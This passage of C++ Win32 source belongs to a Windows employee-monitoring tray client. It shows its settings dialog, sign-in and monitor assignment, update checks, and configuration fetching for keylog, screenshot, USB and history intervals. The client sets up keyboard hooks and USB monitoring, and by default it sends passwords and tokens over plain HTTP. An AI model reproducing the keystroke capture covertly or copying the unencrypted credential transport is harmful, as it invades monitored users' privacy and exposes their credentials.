        addControl(dlg,"STATIC","Server Settings",0,13,57,180,22,4503);
        addControl(dlg,"STATIC","Server IP",0,13,85,91,20,4504);
        addControl(dlg,"EDIT",serverIP.c_str(),WS_BORDER|WS_TABSTOP|ES_AUTOHSCROLL,108,82,310,25,SETTINGS_IP);
        addControl(dlg,"STATIC","Port",0,13,118,91,20,4505);
        addControl(dlg,"EDIT",serverPort.c_str(),WS_BORDER|WS_TABSTOP|ES_AUTOHSCROLL,108,115,310,25,SETTINGS_PORT);
        addControl(dlg,"STATIC","User No",0,13,150,90,20,4510);
        addControl(dlg,"EDIT","",WS_BORDER|WS_TABSTOP|ES_AUTOHSCROLL,108,146,310,25,SETTINGS_SIGNIN_USER);
        addControl(dlg,"STATIC","Password",0,13,185,90,20,4511);
        addControl(dlg,"EDIT","",WS_BORDER|WS_TABSTOP|ES_PASSWORD|ES_AUTOHSCROLL,108,181,310,25,SETTINGS_SIGNIN_PASS);
        addControl(dlg,"STATIC","",SS_LEFT,108,146,310,53,SETTINGS_ACCOUNT_INFO);
        addControl(dlg,"BUTTON","Sign In",WS_TABSTOP,108,215,132,27,SETTINGS_TEST);
        addControl(dlg,"STATIC","● Not signed in",0,13,252,405,21,SETTINGS_CONNECTION);
         addControl(dlg,"STATIC","User:",0,13,202,90,20,SETTINGS_USER);
        addControl(dlg,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL|WS_TABSTOP,108,199,310,250,SETTINGS_USER_NO);
        SendMessageW(GetDlgItem(dlg,SETTINGS_USER_NO),CB_SETDROPPEDWIDTH,540,0);
        addControl(dlg,"BUTTON","Sign Out",WS_TABSTOP,298,215,120,27,SETTINGS_LOGOUT);
         addControl(dlg,"STATIC","",SS_LEFT,16,276,430,54,SETTINGS_NOTICE);
         addControl(dlg,"STATIC","Monitor Settings",0,13,346,180,23,SETTINGS_MONITOR_HEADING);
        addControl(dlg,"STATIC","Monitor",0,13,375,90,21,4400);
        addControl(dlg,"COMBOBOX","",CBS_DROPDOWNLIST|WS_VSCROLL|WS_TABSTOP,108,373,222,220,SETTINGS_MONITOR);
        addControl(dlg,"BUTTON","Edit",WS_TABSTOP,338,373,80,25,SETTINGS_EDIT);
        addControl(dlg,"STATIC","OS",0,13,443,90,21,4402);
        addControl(dlg,"BUTTON","Windows",WS_GROUP|BS_AUTORADIOBUTTON|WS_TABSTOP,108,440,88,24,SETTINGS_OS);
        addControl(dlg,"BUTTON","Mac",BS_AUTORADIOBUTTON|WS_TABSTOP,200,440,64,24,SETTINGS_OS_MAC);
        addControl(dlg,"BUTTON","Ubuntu",BS_AUTORADIOBUTTON|WS_TABSTOP,268,440,100,24,SETTINGS_OS_UBUNTU);
        addControl(dlg,"STATIC","—",0,108,443,310,21,SETTINGS_INFO_OS);
        addControl(dlg,"STATIC","Machine",0,13,476,90,21,4403);
        addControl(dlg,"BUTTON","Laptop",WS_GROUP|BS_AUTORADIOBUTTON|WS_TABSTOP,108,473,108,24,SETTINGS_MACHINE);
        addControl(dlg,"BUTTON","Desktop",BS_AUTORADIOBUTTON|WS_TABSTOP,220,473,108,24,SETTINGS_MACHINE_DESKTOP);
        addControl(dlg,"STATIC","—",0,108,476,310,21,SETTINGS_INFO_MACHINE);
        addControl(dlg,"STATIC","IP address",0,13,509,90,21,4404);
        addControl(dlg,"STATIC","—",0,108,509,310,21,SETTINGS_MONITOR_IP);
        addControl(dlg,"STATIC","Remark",0,13,542,90,21,4405);
        addControl(dlg,"EDIT","",WS_BORDER|WS_TABSTOP|ES_AUTOHSCROLL,108,539,310,25,SETTINGS_REMARK);
        addControl(dlg,"STATIC","—",0,108,542,310,21,SETTINGS_INFO_REMARK);
        addControl(dlg,"BUTTON","Show status notifications",BS_AUTOCHECKBOX|WS_TABSTOP,108,572,250,24,SETTINGS_NOTIFY);
        addControl(dlg,"STATIC","Updates",0,13,609,180,22,SETTINGS_UPDATE_HEADING);
        addControl(dlg,"EDIT",readClientSetting("Update","url","").c_str(),
                   WS_BORDER|WS_TABSTOP|ES_AUTOHSCROLL,108,636,310,25,SETTINGS_UPDATE_URL);
        addControl(dlg,"BUTTON","Check new version",WS_TABSTOP,108,671,160,27,SETTINGS_UPDATE_CHECK);
        addControl(dlg,"BUTTON","Update",WS_TABSTOP,277,671,120,27,SETTINGS_UPDATE_INSTALL);
        EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_INSTALL),FALSE);
        addControl(dlg,"STATIC",("Installed: "+APP_VERSION).c_str(),SS_LEFT,108,703,310,26,SETTINGS_UPDATE_STATUS);

        addControl(dlg,"BUTTON","Send All Logs",WS_TABSTOP,13,625,150,28,SETTINGS_SEND_ALL);
        addControl(dlg,"BUTTON","Refresh Configuration",WS_TABSTOP,174,625,210,28,SETTINGS_REFRESH_CONFIG);
        CheckDlgButton(dlg,SETTINGS_NOTIFY,notificationsEnabled?BST_CHECKED:BST_UNCHECKED);
        addControl(dlg,"BUTTON","Lock Settings",WS_TABSTOP,214,607,112,30,SETTINGS_LOCK_SETTINGS);
        addControl(dlg,"BUTTON","Save Monitor",WS_TABSTOP|BS_DEFPUSHBUTTON,108,607,96,30,SETTINGS_SAVE);
        addControl(dlg,"BUTTON","Close",WS_TABSTOP,332,607,86,30,SETTINGS_CLOSE);
        ShowWindow(GetDlgItem(dlg,SETTINGS_USER),SW_HIDE);
        ShowWindow(GetDlgItem(dlg,SETTINGS_USER_NO),SW_HIDE);
        refreshUnifiedMonitors(dlg);
        updateUnifiedVisibility(dlg);
        return TRUE;
    }
    case WM_DESTROY:
        if(activeSettingsWindow==dlg)activeSettingsWindow=nullptr;
        return TRUE;
    case WM_APP+0x275:{
        Json::Value result;
        {std::lock_guard<std::mutex> guard(updateResultMutex);result=updateResult;}
        EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_CHECK),TRUE);
        const bool ok=result.get("success",false).asBool();
        if(!ok){
            setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,
                result.get("message",result.get("error","Update helper failed")).asString());
            EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_INSTALL),FALSE);
            return TRUE;
        }
        if(wp==1){
            selectedUpdateVersion=result.get("available",false).asBool()?
                result.get("version","").asString():"";
            setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,
                result.get("message","No update available").asString());
            EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_INSTALL),!selectedUpdateVersion.empty());
        }else if(wp==2){
            if(result.get("version","").asString()!=selectedUpdateVersion){
                setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,"Update version changed; check again");
                return TRUE;
            }
            const auto path=result.get("packagePath","").asString();
            const auto hash=result.get("sha256","").asString();
            setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,"Download verified; launching updater...");
            if(!launchUpdateHelper(dlg,"Apply","",path,hash)){
                setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,"Unable to launch Windows update installer");
                EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_INSTALL),TRUE);
                return TRUE;
            }
            EndDialog(dlg,IDOK);
            // Use the normal tray exit so keyboard hooks and network threads
            // are cleaned up before the helper replaces MonitorClient.exe.
            if(hMainWindow)PostMessageW(hMainWindow,WM_COMMAND,ID_TRAY_EXIT,0);
        }
        return TRUE;
    }
    case WM_APP+0x143:
        EnableWindow(GetDlgItem(dlg,SETTINGS_TEST),TRUE);
        setDlgUtf8Text(dlg,SETTINGS_CONNECTION,wp?"● Server reachable":"● Server unavailable");
        if(wp && applyUnifiedServer(dlg)){
            refreshUnifiedMonitors(dlg);
            updateUnifiedVisibility(dlg);
            setDlgUtf8Text(dlg,SETTINGS_CONNECTION,"● Server reachable");
        }
        return TRUE;
    case WM_COMMAND:{
        const int id=LOWORD(wp);
        if(id==SETTINGS_CLOSE||id==IDCANCEL){
            EndDialog(dlg,IDCANCEL);return TRUE;
        }
        if(id==SETTINGS_TEST){
            const std::string userNo=editText(dlg,SETTINGS_SIGNIN_USER);
            const std::string password=editText(dlg,SETTINGS_SIGNIN_PASS);
            if(userNo.empty()||password.empty()){
                setDlgUtf8Text(dlg,SETTINGS_CONNECTION,"Enter User No and password");
                return TRUE;
            }
            if(!applyUnifiedServer(dlg))return TRUE;
            EnableWindow(GetDlgItem(dlg,SETTINGS_TEST),FALSE);
            setDlgUtf8Text(dlg,SETTINGS_CONNECTION,"● Signing in...");
            Json::Value req;req["action"]="login";req["user_no"]=userNo;req["password"]=password;
            const Json::Value answer=callClientAuth(req);
            setDlgUtf8Text(dlg,SETTINGS_SIGNIN_PASS,"");
            EnableWindow(GetDlgItem(dlg,SETTINGS_TEST),TRUE);
            const std::string token=answer.get("token","").asString();
            if(!answer.get("success",false).asBool()||token.size()!=64){
                setDlgUtf8Text(dlg,SETTINGS_CONNECTION,answer.get("error","Sign in failed").asString());
                return TRUE;
            }
            {std::lock_guard<std::mutex> guard(authMutex);clientToken=token;}
            rememberClientToken(token);
            signedInUsername=answer["user"].get("user_no",userNo).asString();
            signedInFullName=answer["user"].get("name","").asString();
            selectedMonitorId.store(answer.get("monitor_id",0).asInt());
            connectionStatus.serverConnected=true;
            setDlgUtf8Text(dlg,SETTINGS_CONNECTION,"● Signed in");
            refreshUnifiedMonitors(dlg);
            updateUnifiedVisibility(dlg);
            updateTrayIcon();
            return TRUE;
        }
        if(id==SETTINGS_SEND_ALL){
            std::thread([]{sendInitialDataRequests();}).detach();
            return TRUE;
        }
        if(id==SETTINGS_REFRESH_CONFIG){
            std::thread([]{manualConfigRefresh();}).detach();
            return TRUE;
        }
        if(id==SETTINGS_EDIT && HIWORD(wp)==BN_CLICKED){
            const int index=(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETCURSEL,0,0);
            const int monitorId=index<0?0:(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETITEMDATA,index,0);
            if(monitorId>0 && !(settingsAssignmentLocked||settingsMonitorLocked)){
                if(settingsEditing)changeMonitorFields(dlg); // discard unsaved values
                else settingsEditing=true;
                updateUnifiedVisibility(dlg);
            }
            return TRUE;
        }
        if(id==SETTINGS_MONITOR&&HIWORD(wp)==CBN_SELCHANGE){
            if(settingsAssignmentLocked||settingsMonitorLocked){
                refreshUnifiedMonitors(dlg);updateUnifiedVisibility(dlg);return TRUE;
            }
            changeMonitorFields(dlg);
            updateUnifiedVisibility(dlg);
            const int ix=(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETCURSEL,0,0);
            const int chosen=ix<0?0:(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETITEMDATA,ix,0);
            // Monitor selection is a draft until Save is clicked. Do not
            // change the active telemetry session on combo-box selection.
            std::string ip="—";
            for(const auto& item:settingsMonitors)
                if(item.get("id",0).asInt()==chosen){ip=item.get("ip_address","—").asString();break;}
            setDlgUtf8Text(dlg,SETTINGS_MONITOR_IP,ip);
            return TRUE;
        }
        if(id==SETTINGS_USER_NO && HIWORD(wp)==CBN_SELCHANGE){
            const std::string number=selectedUserNo(dlg);
            if(number.empty()){
                if(!settingsPendingUserNo.empty()){
                    settingsPendingUserNo.clear();
                    refreshUnifiedMonitors(dlg);
                    updateUnifiedVisibility(dlg);
                }
                return TRUE;
            }
            if(!settingsPendingUserNo.empty() && number==signedInUsername){
                settingsPendingUserNo.clear();
                refreshUnifiedMonitors(dlg);
                updateUnifiedVisibility(dlg);
                return TRUE;
            }
            if(!getClientToken().empty() && (settingsAssignmentLocked||settingsMonitorLocked)){
                showUtf8Message(dlg,"User assignment is locked. Ask your administrator to edit the monitor.",
                    "Assignment locked",MB_OK|MB_ICONWARNING);
                selectDirectoryUser(dlg,signedInUsername);return TRUE;
            }
            if(!getClientToken().empty() && number==signedInUsername)return TRUE;
            if(!applyUnifiedServer(dlg)){
                selectDirectoryUser(dlg,signedInUsername);return TRUE;
            }
            const bool changing=!getClientToken().empty();
            settingsEditing=false; // switching users resets details/edit mode
            Json::Value request;request["action"]=changing?"switch_user":"enroll";
            request["user_no"]=number;
            const Json::Value response=callClientAuth(request);
            const std::string token=response.get("token","").asString();
            const int monitor=response.get("monitor_id",0).asInt();
            if(!response.get("success",false).asBool()||token.size()!=64||monitor<=0){
                if(response.get("code","").asString()=="no_monitors"){
                    settingsPendingUserNo=number;
                    settingsMonitors=response.get("monitors",Json::arrayValue);
                    sortMonitorOptions(settingsMonitors);
                    const HWND combo=GetDlgItem(dlg,SETTINGS_MONITOR);
                    SendMessageW(combo,CB_RESETCONTENT,0,0);
                    for(const auto& existing:settingsMonitors){
                        const int existingId=existing.get("id",0).asInt();
                        const std::string label=existing.get("ip_address","-").asString()+" | "+
                            existing.get("platform","-").asString()+"-"+existing.get("type","-").asString();
                        const std::wstring wide=utf8ToWide(label);
                        const int index=(int)SendMessageW(combo,CB_ADDSTRING,0,(LPARAM)wide.c_str());
                        SendMessageW(combo,CB_SETITEMDATA,index,existingId);
                    }
                    const int i=(int)SendMessageW(combo,CB_ADDSTRING,0,(LPARAM)L"Add new...");
                    SendMessageW(combo,CB_SETITEMDATA,i,-1);
                    SendMessageW(combo,CB_SETCURSEL,i,0);
                    settingsDirectoryError.clear();
                    changeMonitorFields(dlg);updateUnifiedVisibility(dlg);
                    return TRUE;
                }
                showUtf8Message(dlg,response.get("error","Unable to select user.").asString(),
                    "User",MB_OK|MB_ICONWARNING);
                selectDirectoryUser(dlg,signedInUsername);
                refreshUnifiedMonitors(dlg);updateUnifiedVisibility(dlg);return TRUE;
            }
            settingsPendingUserNo.clear();
            {std::lock_guard<std::mutex> lock(authMutex);clientToken=token;}
            selectedMonitorId.store(monitor);
            signedInUsername=number;
            signedInFullName.clear();
            rememberClientToken(token);
            refreshUnifiedMonitors(dlg);
            updateUnifiedVisibility(dlg);
            if(!keyboardHook)setupKeyboardHook();
            if(!usbMonitoringActive)setupUSBMONITORING();
            updateTrayIcon();
            return TRUE;
        }
        if(id==SETTINGS_LOGOUT){
            if(!getClientToken().empty()){
                Json::Value req;req["action"]="logout";callClientAuth(req);
            }
            const std::string target=credentialTarget();
            CredDeleteA(target.c_str(),CRED_TYPE_GENERIC,0);
            {std::lock_guard<std::mutex> lock(authMutex);clientToken.clear();}
            selectedMonitorId.store(0);
            signedInUsername.clear();
            signedInFullName.clear();
            setDlgUtf8Text(dlg,SETTINGS_SIGNIN_PASS,"");
            selectDirectoryUser(dlg,"");
            settingsAssignmentLocked=false;
            if(keyboardHook)removeKeyboardHook();
            connectionStatus.serverConnected=false;
            refreshUnifiedMonitors(dlg);updateUnifiedVisibility(dlg);
            updateTrayIcon();return TRUE;
        }
        if(id==SETTINGS_LOCK_SETTINGS){
            if(settingsAssignmentLocked||settingsMonitorLocked||getClientToken().empty())return TRUE;
            if(MessageBoxW(dlg,L"Lock this monitor's settings? Only an administrator can unlock them in the web portal.",
                           L"Lock Settings",MB_YESNO|MB_ICONWARNING)!=IDYES)return TRUE;
            Json::Value req;req["action"]="lock_settings";
            req["remark"]=editText(dlg,SETTINGS_REMARK);
            req["os"]=IsDlgButtonChecked(dlg,SETTINGS_OS_MAC)==BST_CHECKED?"Mac":
                IsDlgButtonChecked(dlg,SETTINGS_OS_UBUNTU)==BST_CHECKED?"Ubuntu":"Windows";
            req["machine"]=IsDlgButtonChecked(dlg,SETTINGS_MACHINE_DESKTOP)==BST_CHECKED?"desktop":"laptop";
            const Json::Value answer=callClientAuth(req);
            if(!answer.get("success",false).asBool()){
                showUtf8Message(dlg,answer.get("error","Cannot lock settings.").asString(),
                    "Lock Settings",MB_OK|MB_ICONERROR);return TRUE;
            }
            refreshUnifiedMonitors(dlg);updateUnifiedVisibility(dlg);
            return TRUE;
        }
        if(id==SETTINGS_UPDATE_URL && HIWORD(wp)==EN_CHANGE){
            selectedUpdateVersion.clear();
            EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_INSTALL),FALSE);
            return TRUE;
        }
        if(id==SETTINGS_UPDATE_CHECK){
            const std::string url=editText(dlg,SETTINGS_UPDATE_URL);
            if(!validUpdateServer(url)){
                setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,
                    "Enter a valid http(s) update server URL (no spaces or query).");
                return TRUE;
            }
            saveClientSetting("Update","url",url);
            selectedUpdateVersion.clear();
            EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_INSTALL),FALSE);
            EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_CHECK),FALSE);
            setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,"Checking update manifest...");
            if(!launchUpdateHelper(dlg,"Check",url)){
                EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_CHECK),TRUE);
                setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,"Update helper not found beside MonitorClient.exe");
            }
            return TRUE;
        }
        if(id==SETTINGS_UPDATE_INSTALL){
            const std::string url=editText(dlg,SETTINGS_UPDATE_URL);
            if(!validUpdateServer(url)||selectedUpdateVersion.empty())return TRUE;
            EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_INSTALL),FALSE);
            EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_CHECK),FALSE);
            setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,"Downloading and verifying package...");
            if(!launchUpdateHelper(dlg,"Stage",url)){
                EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_CHECK),TRUE);
                EnableWindow(GetDlgItem(dlg,SETTINGS_UPDATE_INSTALL),TRUE);
                setDlgUtf8Text(dlg,SETTINGS_UPDATE_STATUS,"Could not launch updater");
            }
            return TRUE;
        }
        if(id==SETTINGS_NOTIFY && HIWORD(wp)==BN_CLICKED){
            const bool enabled=IsDlgButtonChecked(dlg,SETTINGS_NOTIFY)==BST_CHECKED;
            notificationsEnabled.store(enabled);
            saveClientSetting("Client","notifications",enabled?"1":"0");
            if(!enabled)clearPendingTrayNotification();
            updateTrayMenu();
            return TRUE;
        }
        if(id==SETTINGS_SAVE){
            if(!applyUnifiedServer(dlg)){updateUnifiedVisibility(dlg);return TRUE;}
            const bool enabled=IsDlgButtonChecked(dlg,SETTINGS_NOTIFY)==BST_CHECKED;
            notificationsEnabled.store(enabled);
            saveClientSetting("Client","notifications",enabled?"1":"0");
            if(!enabled)clearPendingTrayNotification();
            if(!settingsPendingUserNo.empty()){
                const int currentIndex=(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETCURSEL,0,0);
                const int chosen=currentIndex<0?0:(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETITEMDATA,currentIndex,0);
                if(chosen!=-1){
                    showUtf8Message(dlg,"To reuse an existing monitor, restore this computer's saved device session. Otherwise select Add new or ask an administrator for help.","Monitor selection",MB_OK|MB_ICONWARNING);
                    return TRUE;
                }
                Json::Value req;req["action"]="bootstrap_monitor";req["user_no"]=settingsPendingUserNo;
                req["remark"]=editText(dlg,SETTINGS_REMARK);
                req["os"]=IsDlgButtonChecked(dlg,SETTINGS_OS_MAC)==BST_CHECKED?"Mac":
                    IsDlgButtonChecked(dlg,SETTINGS_OS_UBUNTU)==BST_CHECKED?"Ubuntu":"Windows";
                req["machine"]=IsDlgButtonChecked(dlg,SETTINGS_MACHINE_DESKTOP)==BST_CHECKED?"desktop":"laptop";
                const Json::Value result=callClientAuth(req);
                const std::string token=result.get("token","").asString();
                const int created=result.get("monitor_id",0).asInt();
                if(!result.get("success",false).asBool()||token.size()!=64||created<1){
                    showUtf8Message(dlg,result.get("error","Cannot add first monitor.").asString(),
                        "Add Monitor",MB_OK|MB_ICONERROR);return TRUE;
                }
                {std::lock_guard<std::mutex> lock(authMutex);clientToken=token;}
                selectedMonitorId.store(created);
                signedInUsername=settingsPendingUserNo;settingsPendingUserNo.clear();
                settingsDirectoryError.clear();
                rememberClientToken(token);
                refreshUnifiedMonitors(dlg);updateUnifiedVisibility(dlg);
                if(!keyboardHook)setupKeyboardHook();
                if(!usbMonitoringActive)setupUSBMONITORING();
                updateTrayIcon();return TRUE;
            }
            if(getClientToken().empty()){updateUnifiedVisibility(dlg);return TRUE;}
            const int ix=(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETCURSEL,0,0);
            const int chosen=ix<0?0:(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETITEMDATA,ix,0);
            if(chosen<1 && chosen!=-1){
                showUtf8Message(dlg,"Select a monitor assigned to this user.",
                    "Monitor Settings",MB_OK|MB_ICONWARNING);
                return TRUE;
            }
            if(chosen>0 && chosen!=selectedMonitorId.load()) {
                Json::Value selection;selection["action"]="select";selection["monitor_id"]=chosen;
                const Json::Value accepted=callClientAuth(selection);
                if(!accepted.get("success",false).asBool()){
                    showUtf8Message(dlg,accepted.get("error","Monitor selection denied.").asString(),
                        "Monitor Settings",MB_OK|MB_ICONWARNING);
                    refreshUnifiedMonitors(dlg);return TRUE;
                }
                selectedMonitorId.store(chosen);
                if(!keyboardHook)setupKeyboardHook();
                if(!usbMonitoringActive)setupUSBMONITORING();
                // Confirm the new backend binding immediately, without blocking UI.
                std::thread([]{sendTicEvent();}).detach();
            }
            if(chosen>0&&!settingsEditing){
                updateUnifiedVisibility(dlg);return TRUE;
            }
            if((settingsAssignmentLocked||settingsMonitorLocked) && chosen!=-1){
                showUtf8Message(dlg,"Settings are locked. Ask your administrator to unlock this monitor.",
                    "Monitor Settings",MB_OK|MB_ICONWARNING);return TRUE;
            }
            Json::Value req;req["action"]=chosen==-1?"create_monitor":"save_monitor";
            if(chosen>0)req["monitor_id"]=chosen;
            req["remark"]=editText(dlg,SETTINGS_REMARK);
            req["os"]=IsDlgButtonChecked(dlg,SETTINGS_OS_MAC)==BST_CHECKED?"Mac":
                IsDlgButtonChecked(dlg,SETTINGS_OS_UBUNTU)==BST_CHECKED?"Ubuntu":"Windows";
            req["machine"]=IsDlgButtonChecked(dlg,SETTINGS_MACHINE_DESKTOP)==BST_CHECKED?"desktop":"laptop";
            const Json::Value result=callClientAuth(req);
            if(!result.get("success",false).asBool()){
                showUtf8Message(dlg,result.get("error","Could not save monitor.").asString(),
                    "Monitor Settings",MB_OK|MB_ICONERROR);return TRUE;
            }
            if(chosen==-1){
                const int created=result.get("monitor_id",0).asInt();
                if(created<=0)return TRUE;
                Json::Value selection;selection["action"]="select";selection["monitor_id"]=created;
                const Json::Value selected=callClientAuth(selection);
                if(!selected.get("success",false).asBool()){
                    showUtf8Message(dlg,selected.get("error","Monitor was created but selection failed.").asString(),
                        "Monitor Settings",MB_OK|MB_ICONERROR);return TRUE;
                }
                selectedMonitorId.store(created);
                if(!keyboardHook)setupKeyboardHook();
                if(!usbMonitoringActive)setupUSBMONITORING();
                std::thread([]{sendTicEvent();}).detach();
            }
            refreshUnifiedMonitors(dlg);updateUnifiedVisibility(dlg);
            updateTrayIcon();return TRUE;
        }
        break;
    }
    }
    return FALSE;
}
bool showMonitorSettings() {
    if(activeSettingsWindow&&IsWindow(activeSettingsWindow)){
        ShowWindow(activeSettingsWindow,SW_RESTORE);
        SetForegroundWindow(activeSettingsWindow);
        BringWindowToTop(activeSettingsWindow);
        return true;
    }
    const bool accepted=runDialog(settingsDialogProc,450)==IDOK;
    updateTrayIcon();updateTrayMenu();
    return accepted;
}

// Main function
int main() {
    // Set DPI awareness to handle scaling properly (MinGW compatible)
    SetProcessDPIAware();
    INITCOMMONCONTROLSEX common={sizeof(INITCOMMONCONTROLSEX),ICC_TAB_CLASSES};
    InitCommonControlsEx(&common);
    
    // Initialize COM for GDI+
    CoInitialize(NULL);
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Warning: Could not initialize Winsock" << std::endl;
    }
    
    // Get MAC address
    macAddress = getMacAddress();
    if (macAddress.empty()) {
        std::cerr << "Warning: Could not get MAC address" << std::endl;
    }
    
    // Load only local connection/UI preferences; intervals are server-driven.
    if (!loadSettings()) {
        std::cerr << "Error: Could not load local preferences" << std::endl;
        return 1;
    }
    
    // Fetch configuration from API
    fetchConfigurationFromAPI();
    
    // Do not activate activity capture until a User No and monitor are selected.
    setupSystemTray();
    if (!restoreClientSession()) showClientLogin();
    else if(selectedMonitorId.load()<1) showMonitorSettings();
    
    // Start monitoring thread
    std::thread monitorThread(monitorTask);
    // Monitoring thread started
    
    // Message loop for system tray
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        
        // Check if we should exit
        if (msg.message == WM_QUIT) {
            break;
        }
    }
    
    // Cleanup
    activeRunning = false;
    monitorThread.join();
    removeKeyboardHook();
    cleanupUSBMONITORING();
    cleanupSystemTray();

    CoUninitialize();
    WSACleanup();
    
    return 0;
}

// Write debug log to file
void writeDebugLog(const std::string& message) {
    std::ofstream logFile("monitor_debug.log", std::ios::app);
    if (logFile.is_open()) {
        std::string timestamp = getCurrentDateTimeString();
        logFile << "[" << timestamp << "] " << message << std::endl;
        logFile.close();
    }
} 

// Only server endpoint and UI notification preference are local. Device
// identity is stored server-side and the bearer token in Credential Manager.
bool loadSettings() {
    serverIP=readClientSetting("Server","ip","192.168.1.45");
    serverPort=readClientSetting("Server","port","8924");
    if(serverIP.empty())serverIP="192.168.1.45";
    if(serverPort.empty()||serverPort.find_first_not_of("0123456789")!=std::string::npos)
        serverPort="8924";
    notificationsEnabled=readClientSetting("Client","notifications","1")!="0";
    API_BASE_URL=(serverPort=="8924"?"http://":"https://")+serverIP+":"+serverPort;
    return true;
}

// Configuration Management Functions
bool fetchConfigurationFromAPI() {
    if (isConfigUpdating) {
        writeDebugLog("Configuration update already in progress, skipping");
        return false;
    }
    
    isConfigUpdating = true;
    writeDebugLog("Fetching configuration from API");
    
    std::string configURL = API_BASE_URL + "/webapi_config.php?platform=windows";
    
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        writeDebugLog("Failed to initialize internet connection");
        isConfigUpdating = false;
        return false;
    }
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, configURL.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        writeDebugLog("Failed to open configuration URL: " + configURL);
        InternetCloseHandle(hInternet);
        isConfigUpdating = false;
        return false;
    }
    
    std::string response;
    char buffer[4096];
    DWORD bytesRead;
    
    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    if (response.empty()) {
        writeDebugLog("No configuration data received");
        isConfigUpdating = false;
        return false;
    }
    
    // Parse JSON response
    Json::Value root;
    Json::Reader reader;
    
    if (!reader.parse(response, root)) {
        writeDebugLog("Failed to parse configuration JSON: " + reader.getFormattedErrorMessages());
        isConfigUpdating = false;
        return false;
    }
    
    if (!root["success"].asBool()) {
        writeDebugLog("Configuration fetch failed: " + root["error"].asString());
        isConfigUpdating = false;
        return false;
    }
    
    // Update configuration
    Json::Value data = root["data"];
    if (data.isObject()) {
        updateConfiguration(data);
        writeDebugLog("Configuration updated successfully");
        isConfigUpdating = false;
        return true;
    }
    
    writeDebugLog("Invalid configuration data format");
    isConfigUpdating = false;
    return false;
}

void updateConfiguration(const Json::Value& config) {
    // Update intervals
    if (config["intervals"].isObject()) {
        Json::Value intervals = config["intervals"];
        
        if (intervals["screenshot"].isInt()) {
            screenInterval = intervals["screenshot"].asInt();
        }
        if (intervals["tic"].isInt()) {
            ticInterval = intervals["tic"].asInt();
        }
        if (intervals["history"].isInt()) {
            historyInterval = intervals["history"].asInt();
        }
        if (intervals["keylog"].isInt()) {
            keyInterval = intervals["keylog"].asInt();
        }
        if (intervals["usb"].isInt()) {
            usbInterval = intervals["usb"].asInt();
        }
        if (intervals["config_refresh"].isInt()) {
            configRefreshInterval = intervals["config_refresh"].asInt();
        }
    }
    
    // Store current configuration
    currentConfig.intervals.screenshot = screenInterval;
    currentConfig.intervals.tic = ticInterval;
    currentConfig.intervals.history = historyInterval;
    currentConfig.intervals.keylog = keyInterval;
    currentConfig.intervals.usb = usbInterval;
    currentConfig.intervals.config_refresh = configRefreshInterval;
    
    if (config["platform"].isString()) {
        currentConfig.platform = config["platform"].asString();
    }
    if (config["version"].isString()) {
        currentConfig.version = config["version"].asString();
    }
    if (config["last_updated"].isString()) {
        currentConfig.last_updated = config["last_updated"].asString();
    }
    
    lastConfigUpdate = std::chrono::system_clock::now();
    
    // Log configuration update
    writeDebugLog("Configuration updated:");
    writeDebugLog("  Screenshot: " + std::to_string(screenInterval) + "s");
    writeDebugLog("  Tic: " + std::to_string(ticInterval) + "s");
    writeDebugLog("  History: " + std::to_string(historyInterval) + "s");
    writeDebugLog("  Keylog: " + std::to_string(keyInterval) + "s");
    writeDebugLog("  USB: " + std::to_string(usbInterval) + "s");
    writeDebugLog("  Config Refresh: " + std::to_string(configRefreshInterval) + "s");
}

void manualConfigRefresh() {
    writeDebugLog("Manual configuration refresh requested");
    fetchConfigurationFromAPI();
}

static HICON greenTrayIcon=nullptr;
static HICON redTrayIcon=nullptr;
static UINT trayTaskbarCreatedMessage=0;
// Setup system tray
void setupSystemTray() {
    // Restore the one status icon if Windows Explorer restarts.
    trayTaskbarCreatedMessage=RegisterWindowMessageA("TaskbarCreated");
    WNDCLASSEXA wcex;
    ZeroMemory(&wcex, sizeof(WNDCLASSEXA));
    wcex.cbSize = sizeof(WNDCLASSEXA);
    wcex.lpfnWndProc = WindowProc;
    wcex.hInstance = GetModuleHandleA(NULL);
